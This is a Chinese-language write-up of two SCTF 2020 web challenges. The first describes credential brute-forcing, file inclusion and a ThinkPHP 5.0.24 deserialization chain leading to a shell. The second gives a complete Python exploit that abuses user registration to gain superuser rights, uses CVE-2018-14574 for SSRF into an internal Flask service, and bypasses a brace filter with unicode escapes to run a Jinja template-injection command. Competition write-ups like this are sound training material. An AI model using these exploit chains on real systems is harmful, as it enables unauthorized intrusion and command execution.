---
title: SCTF 2020 两道Web题 Writeup
tags: 
    - Writeup
    - CTF
    - XCTF
date: 2020-7-7
---

## UnsafeDefenseSystem

PHP/5.6.26, tp 5.0.24
经过一番吐血的信息搜集，看到了这个破静态站的源码里竟然有注释  

{% asset_img hint.png hint in comment %}

> 我要对出题人使出极限一换一

访问/protect.py能看到一个超长的憨批监控脚本，其实也不用看  
在静态站注释提示的/public/nationalsb/login.php的注释中又看到了关于密码的提示

{% asset_img passwd_hint.png passwd_hint %}

通过爆破得到用户名密码：

```text
Admin1964752
DsaPPPP!@#amspe1221
```

后台存在lfi。经过一番读文件，看到index controller中存在反序列化点

{% asset_img entry.png unserialize entry %}

结合上文所知道的thinkphp版本可以搜到:

https://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/  
https://xz.aliyun.com/t/7594

出题人可能是想让条件竞争过protect.py，但是实际上我们可以往/tmp目录底下写文件，并且在nationalsb那里包含这一文件，最终拿到shell

{% asset_img phpinfo.png phpinfo %}

## jsonhub

白盒审计。对外开放的是web1，一个Django服务，内网还有个flask。

首先整理思路：首先要过那个django的token，然后ssrf请求flask_rpc，这样才能带上Content-Type发POST请求

{% asset_img create_user.png User creation flaw %}

很明显，注册的时候参数完全可控，也就是说可以伪造管理员身份。将两个字段，`is_superuser`与`is_staff`都设置为True，就能访问 `http://39.104.19.182/admin/app/token/` 拿到token了。

在请求后方flask服务前，django服务对`REMOTE_URL`进行了验证。由于题目部署在了docker里，访问公网ip时`REMOTE_URL`实际上是172.多少多少（即使不在docker里也是公网ip）。

https://xz.aliyun.com/t/3302  
利用CVE-2018-14574漏洞进行跳转即可

再看第二个服务：

```python
@app.before_request
def before_request():
    data = str(request.data)
    log()
    if "{{" in data or "}}" in data or "{%" in data or "%}" in data:
        abort(401)
...
    json.loads(...)
```

python中的json模块在解析json时会自动将转义过的字符恢复，所以可以用`"\u007b"`来绕过`before_request`
关于表达式的正则过滤，由于对符号的过滤不严格导致了一个非预期，甚至完全不需要管num1和num2：

exploit:

```python
from requests import Request, session, get, post
from bs4 import BeautifulSoup
from base64 import b64encode
import json
HOST = 'http://39.104.19.182'


ses = session()
USER = 'frkasdf'
PASS = 'qwer'

# session 默认keep-alive，这个服务端好像有点连接性问题，所以单独请求
post(HOST + '/reg/', json={
    'username': USER,
    'password': PASS,
    'is_staff': True,
    'is_superuser': True
}).json()['code']

ses.post(HOST + '/login/', json={
    'username': USER,
    'password': PASS,
})

page = BeautifulSoup(get(
    HOST + '/admin/app/token/', cookies=ses.cookies
).text, 'lxml')
token = page.find('td', attrs={'class': 'field-Token'}).text

ssti = '{{config.__class__.__init__.__globals__["os"].popen("/readflag").read() + ""}}'

payload = ('{' + json.dumps({
    'num1': '', 'num2': '', 'symbols': ssti,
})[1:-1].replace('{', '\\u007b').replace('}', '\\u007d') + '}')

payload = b64encode(payload.encode()).decode()

req = Request('GET', HOST + '//127.0.0.1:8000/flask_rpc', params={
    'methods': 'POST',
    'url': 'http://localhost:5000/caculator',
    # flask在:5000
    'data': payload
}).prepare()

print(json.loads(ses.post(HOST + '/home/', json={
    'url': req.url,
    'token': token
}).json()['message'])['message'])
```
